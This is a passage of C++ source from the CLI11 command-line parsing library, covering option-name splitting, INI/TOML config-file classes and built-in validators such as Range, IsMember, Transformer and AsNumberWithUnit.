            if (current.size() > 1 && current[0] == '-' && valid_first_char(current[1])) {
                name = current.substr(1, 1);
                rest = current.substr(2);
                return true;
            }
            return false;
        }

        CLI11_INLINE bool split_long(const std::string& current, std::string& name, std::string& value) {
            if (current.size() > 2 && current.compare(0, 2, "--") == 0 && valid_first_char(current[2])) {
                auto loc = current.find_first_of('=');
                if (loc != std::string::npos) {
                    name = current.substr(2, loc - 2);
                    value = current.substr(loc + 1);
                }
                else {
                    name = current.substr(2);
                    value = "";
                }
                return true;
            }
            return false;
        }

        CLI11_INLINE bool split_windows_style(const std::string& current, std::string& name, std::string& value) {
            if (current.size() > 1 && current[0] == '/' && valid_first_char(current[1])) {
                auto loc = current.find_first_of(':');
                if (loc != std::string::npos) {
                    name = current.substr(1, loc - 1);
                    value = current.substr(loc + 1);
                }
                else {
                    name = current.substr(1);
                    value = "";
                }
                return true;
            }
            return false;
        }

        CLI11_INLINE std::vector<std::string> split_names(std::string current) {
            std::vector<std::string> output;
            std::size_t val = 0;
            while ((val = current.find(',')) != std::string::npos) {
                output.push_back(trim_copy(current.substr(0, val)));
                current = current.substr(val + 1);
            }
            output.push_back(trim_copy(current));
            return output;
        }

        CLI11_INLINE std::vector<std::pair<std::string, std::string>> get_default_flag_values(const std::string& str) {
            std::vector<std::string> flags = split_names(str);
            flags.erase(std::remove_if(flags.begin(),
                flags.end(),
                [](const std::string& name) {
                    return ((name.empty()) || (!(((name.find_first_of('{') != std::string::npos) &&
                        (name.back() == '}')) ||
                        (name[0] == '!'))));
                }),
                flags.end());
            std::vector<std::pair<std::string, std::string>> output;
            output.reserve(flags.size());
            for (auto& flag : flags) {
                auto def_start = flag.find_first_of('{');
                std::string defval = "false";
                if ((def_start != std::string::npos) && (flag.back() == '}')) {
                    defval = flag.substr(def_start + 1);
                    defval.pop_back();
                    flag.erase(def_start, std::string::npos);  // NOLINT(readability-suspicious-call-argument)
                }
                flag.erase(0, flag.find_first_not_of("-!"));
                output.emplace_back(flag, defval);
            }
            return output;
        }

        CLI11_INLINE std::tuple<std::vector<std::string>, std::vector<std::string>, std::string>
            get_names(const std::vector<std::string>& input, bool allow_non_standard) {

            std::vector<std::string> short_names;
            std::vector<std::string> long_names;
            std::string pos_name;
            for (std::string name : input) {
                if (name.length() == 0) {
                    continue;
                }
                if (name.length() > 1 && name[0] == '-' && name[1] != '-') {
                    if (name.length() == 2 && valid_first_char(name[1])) {
                        short_names.emplace_back(1, name[1]);
                    }
                    else if (name.length() > 2) {
                        if (allow_non_standard) {
                            name = name.substr(1);
                            if (valid_name_string(name)) {
                                short_names.push_back(name);
                            }
                            else {
                                throw BadNameString::BadLongName(name);
                            }
                        }
                        else {
                            throw BadNameString::MissingDash(name);
                        }
                    }
                    else {
                        throw BadNameString::OneCharName(name);
                    }
                }
                else if (name.length() > 2 && name.substr(0, 2) == "--") {
                    name = name.substr(2);
                    if (valid_name_string(name)) {
                        long_names.push_back(name);
                    }
                    else {
                        throw BadNameString::BadLongName(name);
                    }
                }
                else if (name == "-" || name == "--" || name == "++") {
                    throw BadNameString::ReservedName(name);
                }
                else {
                    if (!pos_name.empty()) {
                        throw BadNameString::MultiPositionalNames(name);
                    }
                    if (valid_name_string(name)) {
                        pos_name = name;
                    }
                    else {
                        throw BadNameString::BadPositionalName(name);
                    }
                }
            }
            return std::make_tuple(short_names, long_names, pos_name);
        }

    }  // namespace detail



    class App;

    /// Holds values to load into Options
    struct ConfigItem {
        /// This is the list of parents
        std::vector<std::string> parents{};

        /// This is the name
        std::string name{};
        /// Listing of inputs
        std::vector<std::string> inputs{};
        /// @brief indicator if a multiline vector separator was inserted
        bool multiline{ false };
        /// The list of parents and name joined by "."
        CLI11_NODISCARD std::string fullname() const {
            std::vector<std::string> tmp = parents;
            tmp.emplace_back(name);
            return detail::join(tmp, ".");
            (void)multiline;  // suppression for cppcheck false positive
        }
    };

    /// This class provides a converter for configuration files.
    class Config {
    protected:
        std::vector<ConfigItem> items{};

    public:
        /// Convert an app into a configuration
        virtual std::string to_config(const App*, bool, bool, std::string) const = 0;

        /// Convert a configuration into an app
        virtual std::vector<ConfigItem> from_config(std::istream&) const = 0;

        /// Get a flag value
        CLI11_NODISCARD virtual std::string to_flag(const ConfigItem& item) const {
            if (item.inputs.size() == 1) {
                return item.inputs.at(0);
            }
            if (item.inputs.empty()) {
                return "{}";
            }
            throw ConversionError::TooManyInputsFlag(item.fullname());  // LCOV_EXCL_LINE
        }

        /// Parse a config file, throw an error (ParseError:ConfigParseError or FileError) on failure
        CLI11_NODISCARD std::vector<ConfigItem> from_file(const std::string& name) const {
            std::ifstream input{ name };
            if (!input.good())
                throw FileError::Missing(name);

            return from_config(input);
        }

        /// Virtual destructor
        virtual ~Config() = default;
    };

    /// This converter works with INI/TOML files; to write INI files use ConfigINI
    class ConfigBase : public Config {
    protected:
        /// the character used for comments
        char commentChar = '#';
        /// the character used to start an array '\0' is a default to not use
        char arrayStart = '[';
        /// the character used to end an array '\0' is a default to not use
        char arrayEnd = ']';
        /// the character used to separate elements in an array
        char arraySeparator = ',';
        /// the character used separate the name from the value
        char valueDelimiter = '=';
        /// the character to use around strings
        char stringQuote = '"';
        /// the character to use around single characters and literal strings
        char literalQuote = '\'';
        /// the maximum number of layers to allow
        uint8_t maximumLayers{ 255 };
        /// the separator used to separator parent layers
        char parentSeparatorChar{ '.' };
        /// comment default values
        bool commentDefaultsBool = false;
        /// specify the config reader should collapse repeated field names to a single vector
        bool allowMultipleDuplicateFields{ false };
        /// Specify the configuration index to use for arrayed sections
        int16_t configIndex{ -1 };
        /// Specify the configuration section that should be used
        std::string configSection{};

    public:
        std::string
            to_config(const App* /*app*/, bool default_also, bool write_description, std::string prefix) const override;

        std::vector<ConfigItem> from_config(std::istream& input) const override;
        /// Specify the configuration for comment characters
        ConfigBase* comment(char cchar) {
            commentChar = cchar;
            return this;
        }
        /// Specify the start and end characters for an array
        ConfigBase* arrayBounds(char aStart, char aEnd) {
            arrayStart = aStart;
            arrayEnd = aEnd;
            return this;
        }
        /// Specify the delimiter character for an array
        ConfigBase* arrayDelimiter(char aSep) {
            arraySeparator = aSep;
            return this;
        }
        /// Specify the delimiter between a name and value
        ConfigBase* valueSeparator(char vSep) {
            valueDelimiter = vSep;
            return this;
        }
        /// Specify the quote characters used around strings and literal strings
        ConfigBase* quoteCharacter(char qString, char literalChar) {
            stringQuote = qString;
            literalQuote = literalChar;
            return this;
        }
        /// Specify the maximum number of parents
        ConfigBase* maxLayers(uint8_t layers) {
            maximumLayers = layers;
            return this;
        }
        /// Specify the separator to use for parent layers
        ConfigBase* parentSeparator(char sep) {
            parentSeparatorChar = sep;
            return this;
        }
        /// comment default value options
        ConfigBase* commentDefaults(bool comDef = true) {
            commentDefaultsBool = comDef;
            return this;
        }
        /// get a reference to the configuration section
        std::string& sectionRef() { return configSection; }
        /// get the section
        CLI11_NODISCARD const std::string& section() const { return configSection; }
        /// specify a particular section of the configuration file to use
        ConfigBase* section(const std::string& sectionName) {
            configSection = sectionName;
            return this;
        }

        /// get a reference to the configuration index
        int16_t& indexRef() { return configIndex; }
        /// get the section index
        CLI11_NODISCARD int16_t index() const { return configIndex; }
        /// specify a particular index in the section to use (-1) for all sections to use
        ConfigBase* index(int16_t sectionIndex) {
            configIndex = sectionIndex;
            return this;
        }
        /// specify that multiple duplicate arguments should be merged even if not sequential
        ConfigBase* allowDuplicateFields(bool value = true) {
            allowMultipleDuplicateFields = value;
            return this;
        }
    };

    /// the default Config is the TOML file format
    using ConfigTOML = ConfigBase;

    /// ConfigINI generates a "standard" INI compliant output
    class ConfigINI : public ConfigTOML {

    public:
        ConfigINI() {
            commentChar = ';';
            arrayStart = '\0';
            arrayEnd = '\0';
            arraySeparator = ' ';
            valueDelimiter = '=';
        }
    };



    class Option;

    /// @defgroup validator_group Validators

    /// @brief Some validators that are provided
    ///
    /// These are simple `std::string(const std::string&)` validators that are useful. They return
    /// a string if the validation fails. A custom struct is provided, as well, with the same user
    /// semantics, but with the ability to provide a new type name.
    /// @{

    ///
    class Validator {
    protected:
        /// This is the description function, if empty the description_ will be used
        std::function<std::string()> desc_function_{ []() { return std::string{}; } };

        /// This is the base function that is to be called.
        /// Returns a string error message if validation fails.
        std::function<std::string(std::string&)> func_{ [](std::string&) { return std::string{}; } };
        /// The name for search purposes of the Validator
        std::string name_{};
        /// A Validator will only apply to an indexed value (-1 is all elements)
        int application_index_ = -1;
        /// Enable for Validator to allow it to be disabled if need be
        bool active_{ true };
        /// specify that a validator should not modify the input
        bool non_modifying_{ false };

        Validator(std::string validator_desc, std::function<std::string(std::string&)> func)
            : desc_function_([validator_desc]() { return validator_desc; }), func_(std::move(func)) {}

    public:
        Validator() = default;
        /// Construct a Validator with just the description string
        explicit Validator(std::string validator_desc) : desc_function_([validator_desc]() { return validator_desc; }) {}
        /// Construct Validator from basic information
        Validator(std::function<std::string(std::string&)> op, std::string validator_desc, std::string validator_name = "")
            : desc_function_([validator_desc]() { return validator_desc; }), func_(std::move(op)),
            name_(std::move(validator_name)) {}
        /// Set the Validator operation function
        Validator& operation(std::function<std::string(std::string&)> op) {
            func_ = std::move(op);
            return *this;
        }
        /// This is the required operator for a Validator - provided to help
        /// users (CLI11 uses the member `func` directly)
        std::string operator()(std::string& str) const;

        /// This is the required operator for a Validator - provided to help
        /// users (CLI11 uses the member `func` directly)
        std::string operator()(const std::string& str) const {
            std::string value = str;
            return (active_) ? func_(value) : std::string{};
        }

        /// Specify the type string
        Validator& description(std::string validator_desc) {
            desc_function_ = [validator_desc]() { return validator_desc; };
            return *this;
        }
        /// Specify the type string
        CLI11_NODISCARD Validator description(std::string validator_desc) const;

        /// Generate type description information for the Validator
        CLI11_NODISCARD std::string get_description() const {
            if (active_) {
                return desc_function_();
            }
            return std::string{};
        }
        /// Specify the type string
        Validator& name(std::string validator_name) {
            name_ = std::move(validator_name);
            return *this;
        }
        /// Specify the type string
        CLI11_NODISCARD Validator name(std::string validator_name) const {
            Validator newval(*this);
            newval.name_ = std::move(validator_name);
            return newval;
        }
        /// Get the name of the Validator
        CLI11_NODISCARD const std::string& get_name() const { return name_; }
        /// Specify whether the Validator is active or not
        Validator& active(bool active_val = true) {
            active_ = active_val;
            return *this;
        }
        /// Specify whether the Validator is active or not
        CLI11_NODISCARD Validator active(bool active_val = true) const {
            Validator newval(*this);
            newval.active_ = active_val;
            return newval;
        }

        /// Specify whether the Validator can be modifying or not
        Validator& non_modifying(bool no_modify = true) {
            non_modifying_ = no_modify;
            return *this;
        }
        /// Specify the application index of a validator
        Validator& application_index(int app_index) {
            application_index_ = app_index;
            return *this;
        }
        /// Specify the application index of a validator
        CLI11_NODISCARD Validator application_index(int app_index) const {
            Validator newval(*this);
            newval.application_index_ = app_index;
            return newval;
        }
        /// Get the current value of the application index
        CLI11_NODISCARD int get_application_index() const { return application_index_; }
        /// Get a boolean if the validator is active
        CLI11_NODISCARD bool get_active() const { return active_; }

        /// Get a boolean if the validator is allowed to modify the input returns true if it can modify the input
        CLI11_NODISCARD bool get_modifying() const { return !non_modifying_; }

        /// Combining validators is a new validator. Type comes from left validator if function, otherwise only set if the
        /// same.
        Validator operator&(const Validator& other) const;

        /// Combining validators is a new validator. Type comes from left validator if function, otherwise only set if the
        /// same.
        Validator operator|(const Validator& other) const;

        /// Create a validator that fails when a given validator succeeds
        Validator operator!() const;

    private:
        void _merge_description(const Validator& val1, const Validator& val2, const std::string& merger);
    };

    /// Class wrapping some of the accessors of Validator
    class CustomValidator : public Validator {
    public:
    };
    // The implementation of the built in validators is using the Validator class;
    // the user is only expected to use the const (static) versions (since there's no setup).
    // Therefore, this is in detail.
    namespace detail {

        /// CLI enumeration of different file types
        enum class path_type { nonexistent, file, directory };

        /// get the type of the path from a file name
        CLI11_INLINE path_type check_path(const char* file) noexcept;

        /// Check for an existing file (returns error message if check fails)
        class ExistingFileValidator : public Validator {
        public:
            ExistingFileValidator();
        };

        /// Check for an existing directory (returns error message if check fails)
        class ExistingDirectoryValidator : public Validator {
        public:
            ExistingDirectoryValidator();
        };

        /// Check for an existing path
        class ExistingPathValidator : public Validator {
        public:
            ExistingPathValidator();
        };

        /// Check for an non-existing path
        class NonexistentPathValidator : public Validator {
        public:
            NonexistentPathValidator();
        };

        /// Validate the given string is a legal ipv4 address
        class IPV4Validator : public Validator {
        public:
            IPV4Validator();
        };

        class EscapedStringTransformer : public Validator {
        public:
            EscapedStringTransformer();
        };

    }  // namespace detail

    // Static is not needed here, because global const implies static.

    /// Check for existing file (returns error message if check fails)
    const detail::ExistingFileValidator ExistingFile;

    /// Check for an existing directory (returns error message if check fails)
    const detail::ExistingDirectoryValidator ExistingDirectory;

    /// Check for an existing path
    const detail::ExistingPathValidator ExistingPath;

    /// Check for an non-existing path
    const detail::NonexistentPathValidator NonexistentPath;

    /// Check for an IP4 address
    const detail::IPV4Validator ValidIPV4;

    /// convert escaped characters into their associated values
    const detail::EscapedStringTransformer EscapedString;

    /// Validate the input as a particular type
    template <typename DesiredType> class TypeValidator : public Validator {
    public:
        explicit TypeValidator(const std::string& validator_name)
            : Validator(validator_name, [](std::string& input_string) {
            using CLI::detail::lexical_cast;
            auto val = DesiredType();
            if (!lexical_cast(input_string, val)) {
                return std::string("Failed parsing ") + input_string + " as a " + detail::type_name<DesiredType>();
            }
            return std::string();
                }) {}
        TypeValidator() : TypeValidator(detail::type_name<DesiredType>()) {}
    };

    /// Check for a number
    const TypeValidator<double> Number("NUMBER");

    /// Modify a path if the file is a particular default location, can be used as Check or transform
    /// with the error return optionally disabled
    class FileOnDefaultPath : public Validator {
    public:
        explicit FileOnDefaultPath(std::string default_path, bool enableErrorReturn = true);
    };

    /// Produce a range (factory). Min and max are inclusive.
    class Range : public Validator {
    public:
        /// This produces a range with min and max inclusive.
        ///
        /// Note that the constructor is templated, but the struct is not, so C++17 is not
        /// needed to provide nice syntax for Range(a,b).
        template <typename T>
        Range(T min_val, T max_val, const std::string& validator_name = std::string{}) : Validator(validator_name) {
            if (validator_name.empty()) {
                std::stringstream out;
                out << detail::type_name<T>() << " in [" << min_val << " - " << max_val << "]";
                description(out.str());
            }

            func_ = [min_val, max_val](std::string& input) {
                using CLI::detail::lexical_cast;
                T val;
                bool converted = lexical_cast(input, val);
                if ((!converted) || (val < min_val || val > max_val)) {
                    std::stringstream out;
                    out << "Value " << input << " not in range [";
                    out << min_val << " - " << max_val << "]";
                    return out.str();
                }
                return std::string{};
                };
        }

        /// Range of one value is 0 to value
        template <typename T>
        explicit Range(T max_val, const std::string& validator_name = std::string{})
            : Range(static_cast<T>(0), max_val, validator_name) {}
    };

    /// Check for a non negative number
    const Range NonNegativeNumber((std::numeric_limits<double>::max)(), "NONNEGATIVE");

    /// Check for a positive valued number (val>0.0), <double>::min  here is the smallest positive number
    const Range PositiveNumber((std::numeric_limits<double>::min)(), (std::numeric_limits<double>::max)(), "POSITIVE");

    /// Produce a bounded range (factory). Min and max are inclusive.
    class Bound : public Validator {
    public:
        /// This bounds a value with min and max inclusive.
        ///
        /// Note that the constructor is templated, but the struct is not, so C++17 is not
        /// needed to provide nice syntax for Range(a,b).
        template <typename T> Bound(T min_val, T max_val) {
            std::stringstream out;
            out << detail::type_name<T>() << " bounded to [" << min_val << " - " << max_val << "]";
            description(out.str());

            func_ = [min_val, max_val](std::string& input) {
                using CLI::detail::lexical_cast;
                T val;
                bool converted = lexical_cast(input, val);
                if (!converted) {
                    return std::string("Value ") + input + " could not be converted";
                }
                if (val < min_val)
                    input = detail::to_string(min_val);
                else if (val > max_val)
                    input = detail::to_string(max_val);

                return std::string{};
                };
        }

        /// Range of one value is 0 to value
        template <typename T> explicit Bound(T max_val) : Bound(static_cast<T>(0), max_val) {}
    };

    namespace detail {
        template <typename T,
            enable_if_t<is_copyable_ptr<typename std::remove_reference<T>::type>::value, detail::enabler> = detail::dummy>
        auto smart_deref(T value) -> decltype(*value) {
            return *value;
        }

        template <
            typename T,
            enable_if_t<!is_copyable_ptr<typename std::remove_reference<T>::type>::value, detail::enabler> = detail::dummy>
        typename std::remove_reference<T>::type& smart_deref(T& value) {
            return value;
        }
        /// Generate a string representation of a set
        template <typename T> std::string generate_set(const T& set) {
            using element_t = typename detail::element_type<T>::type;
            using iteration_type_t = typename detail::pair_adaptor<element_t>::value_type;  // the type of the object pair
            std::string out(1, '{');
            out.append(detail::join(
                detail::smart_deref(set),
                [](const iteration_type_t& v) { return detail::pair_adaptor<element_t>::first(v); },
                ","));
            out.push_back('}');
            return out;
        }

        /// Generate a string representation of a map
        template <typename T> std::string generate_map(const T& map, bool key_only = false) {
            using element_t = typename detail::element_type<T>::type;
            using iteration_type_t = typename detail::pair_adaptor<element_t>::value_type;  // the type of the object pair
            std::string out(1, '{');
            out.append(detail::join(
                detail::smart_deref(map),
                [key_only](const iteration_type_t& v) {
                    std::string res{ detail::to_string(detail::pair_adaptor<element_t>::first(v)) };

                    if (!key_only) {
                        res.append("->");
                        res += detail::to_string(detail::pair_adaptor<element_t>::second(v));
                    }
                    return res;
                },
                ","));
            out.push_back('}');
            return out;
        }

        template <typename C, typename V> struct has_find {
            template <typename CC, typename VV>
            static auto test(int) -> decltype(std::declval<CC>().find(std::declval<VV>()), std::true_type());
            template <typename, typename> static auto test(...) -> decltype(std::false_type());

            static const auto value = decltype(test<C, V>(0))::value;
            using type = std::integral_constant<bool, value>;
        };

        /// A search function
        template <typename T, typename V, enable_if_t<!has_find<T, V>::value, detail::enabler> = detail::dummy>
        auto search(const T& set, const V& val) -> std::pair<bool, decltype(std::begin(detail::smart_deref(set)))> {
            using element_t = typename detail::element_type<T>::type;
            auto& setref = detail::smart_deref(set);
            auto it = std::find_if(std::begin(setref), std::end(setref), [&val](decltype(*std::begin(setref)) v) {
                return (detail::pair_adaptor<element_t>::first(v) == val);
                });
            return { (it != std::end(setref)), it };
        }

        /// A search function that uses the built in find function
        template <typename T, typename V, enable_if_t<has_find<T, V>::value, detail::enabler> = detail::dummy>
        auto search(const T& set, const V& val) -> std::pair<bool, decltype(std::begin(detail::smart_deref(set)))> {
            auto& setref = detail::smart_deref(set);
            auto it = setref.find(val);
            return { (it != std::end(setref)), it };
        }

        /// A search function with a filter function
        template <typename T, typename V>
        auto search(const T& set, const V& val, const std::function<V(V)>& filter_function)
            -> std::pair<bool, decltype(std::begin(detail::smart_deref(set)))> {
            using element_t = typename detail::element_type<T>::type;
            // do the potentially faster first search
            auto res = search(set, val);
            if ((res.first) || (!(filter_function))) {
                return res;
            }
            // if we haven't found it do the longer linear search with all the element translations
            auto& setref = detail::smart_deref(set);
            auto it = std::find_if(std::begin(setref), std::end(setref), [&](decltype(*std::begin(setref)) v) {
                V a{ detail::pair_adaptor<element_t>::first(v) };
                a = filter_function(a);
                return (a == val);
                });
            return { (it != std::end(setref)), it };
        }

        // the following suggestion was made by Nikita Ofitserov(@himikof)
        // done in templates to prevent compiler warnings on negation of unsigned numbers

        /// Do a check for overflow on signed numbers
        template <typename T>
        inline typename std::enable_if<std::is_signed<T>::value, T>::type overflowCheck(const T& a, const T& b) {
            if ((a > 0) == (b > 0)) {
                return ((std::numeric_limits<T>::max)() / (std::abs)(a) < (std::abs)(b));
            }
            return ((std::numeric_limits<T>::min)() / (std::abs)(a) > -(std::abs)(b));
        }
        /// Do a check for overflow on unsigned numbers
        template <typename T>
        inline typename std::enable_if<!std::is_signed<T>::value, T>::type overflowCheck(const T& a, const T& b) {
            return ((std::numeric_limits<T>::max)() / a < b);
        }

        /// Performs a *= b; if it doesn't cause integer overflow. Returns false otherwise.
        template <typename T> typename std::enable_if<std::is_integral<T>::value, bool>::type checked_multiply(T& a, T b) {
            if (a == 0 || b == 0 || a == 1 || b == 1) {
                a *= b;
                return true;
            }
            if (a == (std::numeric_limits<T>::min)() || b == (std::numeric_limits<T>::min)()) {
                return false;
            }
            if (overflowCheck(a, b)) {
                return false;
            }
            a *= b;
            return true;
        }

        /// Performs a *= b; if it doesn't equal infinity. Returns false otherwise.
        template <typename T>
        typename std::enable_if<std::is_floating_point<T>::value, bool>::type checked_multiply(T& a, T b) {
            T c = a * b;
            if (std::isinf(c) && !std::isinf(a) && !std::isinf(b)) {
                return false;
            }
            a = c;
            return true;
        }

    }  // namespace detail
    /// Verify items are in a set
    class IsMember : public Validator {
    public:
        using filter_fn_t = std::function<std::string(std::string)>;

        /// This allows in-place construction using an initializer list
        template <typename T, typename... Args>
        IsMember(std::initializer_list<T> values, Args &&...args)
            : IsMember(std::vector<T>(values), std::forward<Args>(args)...) {}

        /// This checks to see if an item is in a set (empty function)
        template <typename T> explicit IsMember(T&& set) : IsMember(std::forward<T>(set), nullptr) {}

        /// This checks to see if an item is in a set: pointer or copy version. You can pass in a function that will filter
        /// both sides of the comparison before computing the comparison.
        template <typename T, typename F> explicit IsMember(T set, F filter_function) {

            // Get the type of the contained item - requires a container have ::value_type
            // if the type does not have first_type and second_type, these are both value_type
            using element_t = typename detail::element_type<T>::type;             // Removes (smart) pointers if needed
            using item_t = typename detail::pair_adaptor<element_t>::first_type;  // Is value_type if not a map

            using local_item_t = typename IsMemberType<item_t>::type;  // This will convert bad types to good ones
            // (const char * to std::string)

// Make a local copy of the filter function, using a std::function if not one already
            std::function<local_item_t(local_item_t)> filter_fn = filter_function;

            // This is the type name for help, it will take the current version of the set contents
            desc_function_ = [set]() { return detail::generate_set(detail::smart_deref(set)); };

            // This is the function that validates
            // It stores a copy of the set pointer-like, so shared_ptr will stay alive
            func_ = [set, filter_fn](std::string& input) {
                using CLI::detail::lexical_cast;
                local_item_t b;
                if (!lexical_cast(input, b)) {
                    throw ValidationError(input);  // name is added later
                }
                if (filter_fn) {
                    b = filter_fn(b);
                }
                auto res = detail::search(set, b, filter_fn);
                if (res.first) {
                    // Make sure the version in the input string is identical to the one in the set
                    if (filter_fn) {
                        input = detail::value_string(detail::pair_adaptor<element_t>::first(*(res.second)));
                    }

                    // Return empty error string (success)
                    return std::string{};
                }

                // If you reach this point, the result was not found
                return input + " not in " + detail::generate_set(detail::smart_deref(set));
                };
        }

        /// You can pass in as many filter functions as you like, they nest (string only currently)
        template <typename T, typename... Args>
        IsMember(T&& set, filter_fn_t filter_fn_1, filter_fn_t filter_fn_2, Args &&...other)
            : IsMember(
                std::forward<T>(set),
                [filter_fn_1, filter_fn_2](std::string a) { return filter_fn_2(filter_fn_1(a)); },
                other...) {}
    };

    /// definition of the default transformation object
    template <typename T> using TransformPairs = std::vector<std::pair<std::string, T>>;

    /// Translate named items to other or a value set
    class Transformer : public Validator {
    public:
        using filter_fn_t = std::function<std::string(std::string)>;

        /// This allows in-place construction
        template <typename... Args>
        Transformer(std::initializer_list<std::pair<std::string, std::string>> values, Args &&...args)
            : Transformer(TransformPairs<std::string>(values), std::forward<Args>(args)...) {}

        /// direct map of std::string to std::string
        template <typename T> explicit Transformer(T&& mapping) : Transformer(std::forward<T>(mapping), nullptr) {}

        /// This checks to see if an item is in a set: pointer or copy version. You can pass in a function that will filter
        /// both sides of the comparison before computing the comparison.
        template <typename T, typename F> explicit Transformer(T mapping, F filter_function) {

            static_assert(detail::pair_adaptor<typename detail::element_type<T>::type>::value,
                "mapping must produce value pairs");
            // Get the type of the contained item - requires a container have ::value_type
            // if the type does not have first_type and second_type, these are both value_type
            using element_t = typename detail::element_type<T>::type;             // Removes (smart) pointers if needed
            using item_t = typename detail::pair_adaptor<element_t>::first_type;  // Is value_type if not a map
            using local_item_t = typename IsMemberType<item_t>::type;             // Will convert bad types to good ones
            // (const char * to std::string)

// Make a local copy of the filter function, using a std::function if not one already
            std::function<local_item_t(local_item_t)> filter_fn = filter_function;

            // This is the type name for help, it will take the current version of the set contents
            desc_function_ = [mapping]() { return detail::generate_map(detail::smart_deref(mapping)); };

            func_ = [mapping, filter_fn](std::string& input) {
                using CLI::detail::lexical_cast;
                local_item_t b;
                if (!lexical_cast(input, b)) {
                    return std::string();
                    // there is no possible way we can match anything in the mapping if we can't convert so just return
                }
                if (filter_fn) {
                    b = filter_fn(b);
                }
                auto res = detail::search(mapping, b, filter_fn);
                if (res.first) {
                    input = detail::value_string(detail::pair_adaptor<element_t>::second(*res.second));
                }
                return std::string{};
                };
        }

        /// You can pass in as many filter functions as you like, they nest
        template <typename T, typename... Args>
        Transformer(T&& mapping, filter_fn_t filter_fn_1, filter_fn_t filter_fn_2, Args &&...other)
            : Transformer(
                std::forward<T>(mapping),
                [filter_fn_1, filter_fn_2](std::string a) { return filter_fn_2(filter_fn_1(a)); },
                other...) {}
    };

    /// translate named items to other or a value set
    class CheckedTransformer : public Validator {
    public:
        using filter_fn_t = std::function<std::string(std::string)>;

        /// This allows in-place construction
        template <typename... Args>
        CheckedTransformer(std::initializer_list<std::pair<std::string, std::string>> values, Args &&...args)
            : CheckedTransformer(TransformPairs<std::string>(values), std::forward<Args>(args)...) {}

        /// direct map of std::string to std::string
        template <typename T> explicit CheckedTransformer(T mapping) : CheckedTransformer(std::move(mapping), nullptr) {}

        /// This checks to see if an item is in a set: pointer or copy version. You can pass in a function that will filter
        /// both sides of the comparison before computing the comparison.
        template <typename T, typename F> explicit CheckedTransformer(T mapping, F filter_function) {

            static_assert(detail::pair_adaptor<typename detail::element_type<T>::type>::value,
                "mapping must produce value pairs");
            // Get the type of the contained item - requires a container have ::value_type
            // if the type does not have first_type and second_type, these are both value_type
            using element_t = typename detail::element_type<T>::type;             // Removes (smart) pointers if needed
            using item_t = typename detail::pair_adaptor<element_t>::first_type;  // Is value_type if not a map
            using local_item_t = typename IsMemberType<item_t>::type;             // Will convert bad types to good ones
            // (const char * to std::string)
            using iteration_type_t = typename detail::pair_adaptor<element_t>::value_type;  // the type of the object pair

            // Make a local copy of the filter function, using a std::function if not one already
            std::function<local_item_t(local_item_t)> filter_fn = filter_function;

            auto tfunc = [mapping]() {
                std::string out("value in ");
                out += detail::generate_map(detail::smart_deref(mapping)) + " OR {";
                out += detail::join(
                    detail::smart_deref(mapping),
                    [](const iteration_type_t& v) { return detail::to_string(detail::pair_adaptor<element_t>::second(v)); },
                    ",");
                out.push_back('}');
                return out;
                };

            desc_function_ = tfunc;

            func_ = [mapping, tfunc, filter_fn](std::string& input) {
                using CLI::detail::lexical_cast;
                local_item_t b;
                bool converted = lexical_cast(input, b);
                if (converted) {
                    if (filter_fn) {
                        b = filter_fn(b);
                    }
                    auto res = detail::search(mapping, b, filter_fn);
                    if (res.first) {
                        input = detail::value_string(detail::pair_adaptor<element_t>::second(*res.second));
                        return std::string{};
                    }
                }
                for (const auto& v : detail::smart_deref(mapping)) {
                    auto output_string = detail::value_string(detail::pair_adaptor<element_t>::second(v));
                    if (output_string == input) {
                        return std::string();
                    }
                }

                return "Check " + input + " " + tfunc() + " FAILED";
                };
        }

        /// You can pass in as many filter functions as you like, they nest
        template <typename T, typename... Args>
        CheckedTransformer(T&& mapping, filter_fn_t filter_fn_1, filter_fn_t filter_fn_2, Args &&...other)
            : CheckedTransformer(
                std::forward<T>(mapping),
                [filter_fn_1, filter_fn_2](std::string a) { return filter_fn_2(filter_fn_1(a)); },
                other...) {}
    };

    /// Helper function to allow ignore_case to be passed to IsMember or Transform
    inline std::string ignore_case(std::string item) { return detail::to_lower(item); }

    /// Helper function to allow ignore_underscore to be passed to IsMember or Transform
    inline std::string ignore_underscore(std::string item) { return detail::remove_underscore(item); }

    /// Helper function to allow checks to ignore spaces to be passed to IsMember or Transform
    inline std::string ignore_space(std::string item) {
        item.erase(std::remove(std::begin(item), std::end(item), ' '), std::end(item));
        item.erase(std::remove(std::begin(item), std::end(item), '\t'), std::end(item));
        return item;
    }

    /// Multiply a number by a factor using given mapping.
    /// Can be used to write transforms for SIZE or DURATION inputs.
    ///
    /// Example:
    ///   With mapping = `{"b"->1, "kb"->1024, "mb"->1024*1024}`
    ///   one can recognize inputs like "100", "12kb", "100 MB",
    ///   that will be automatically transformed to 100, 14448, 104857600.
    ///
    /// Output number type matches the type in the provided mapping.
    /// Therefore, if it is required to interpret real inputs like "0.42 s",
    /// the mapping should be of a type <string, float> or <string, double>.
    class AsNumberWithUnit : public Validator {
    public:
        /// Adjust AsNumberWithUnit behavior.
        /// CASE_SENSITIVE/CASE_INSENSITIVE controls how units are matched.
        /// UNIT_OPTIONAL/UNIT_REQUIRED throws ValidationError
        ///   if UNIT_REQUIRED is set and unit literal is not found.
        enum Options {
            CASE_SENSITIVE = 0,
            CASE_INSENSITIVE = 1,
            UNIT_OPTIONAL = 0,
            UNIT_REQUIRED = 2,
            DEFAULT = CASE_INSENSITIVE | UNIT_OPTIONAL
        };

        template <typename Number>
        explicit AsNumberWithUnit(std::map<std::string, Number> mapping,
            Options opts = DEFAULT,
            const std::string& unit_name = "UNIT") {
            description(generate_description<Number>(unit_name, opts));
            validate_mapping(mapping, opts);

            // transform function
            func_ = [mapping, opts](std::string& input) -> std::string {
                Number num{};

                detail::rtrim(input);
                if (input.empty()) {
                    throw ValidationError("Input is empty");
                }

                // Find split position between number and prefix
                auto unit_begin = input.end();
                while (unit_begin > input.begin() && std::isalpha(*(unit_begin - 1), std::locale())) {
                    --unit_begin;
                }

                std::string unit{ unit_begin, input.end() };
                input.resize(static_cast<std::size_t>(std::distance(input.begin(), unit_begin)));
                detail::trim(input);

                if (opts & UNIT_REQUIRED && unit.empty()) {
                    throw ValidationError("Missing mandatory unit");
                }
                if (opts & CASE_INSENSITIVE) {
                    unit = detail::to_lower(unit);
                }
                if (unit.empty()) {
                    using CLI::detail::lexical_cast;
                    if (!lexical_cast(input, num)) {
                        throw ValidationError(std::string("Value ") + input + " could not be converted to " +
                            detail::type_name<Number>());
                    }
                    // No need to modify input if no unit passed
                    return {};
                }

                // find corresponding factor
                auto it = mapping.find(unit);
